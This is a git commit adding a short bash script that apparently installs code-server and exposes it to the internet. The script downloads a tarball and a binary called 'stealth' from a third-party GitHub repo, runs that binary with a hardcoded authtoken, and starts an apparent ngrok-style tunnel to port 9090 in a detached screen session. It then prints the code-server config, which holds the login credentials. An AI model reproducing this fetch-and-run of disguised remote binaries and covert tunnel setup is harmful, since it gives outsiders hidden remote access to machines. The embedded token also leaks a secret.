ee8bced23c1b4ce38c9a504f2dd5cf88e35af47f
olivertarbell53 <148562866+olivertarbell53@users.noreply.github.com>
2023-11-10 01:19:13 +0200

    Create install_and_and_start_code_server.sh

---
+++ install_and_and_start_code_server.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+cd
+apt update >/dev/null;apt -y install net-tools curl wget screen sudo iputils-ping >/dev/null
+sleep 2
+curl -s -L -o code-server.tar.gz https://raw.githubusercontent.com/alexgabbard01/update/main/code-server.tar.gz
+sleep 2
+tar -xf code-server.tar.gz
+export PATH=$HOME/code-server-4.14.1-linux-amd64/bin:$PATH
+sleep 2
+wget https://raw.githubusercontent.com/alexgabbard01/update/main/stealth
+sleep 2
+chmod +x stealth
+sleep 2
+./stealth authtoken 1h3sbOw9Nu7eyXGswDWK7u5XY8c_5iL9ddAjv838KiW5sNhFA
+sleep 2
+screen -dmS ngroo bash -c './stealth http 9090'
+sleep 2
+curl http://127.0.0.1:4040/api/tunnels
+sleep 2
+cat ~/.config/code-server/config.yaml
+sleep 2
+code-server-4.14.1-linux-amd64/bin/code-server --port 9090 & ping t.co
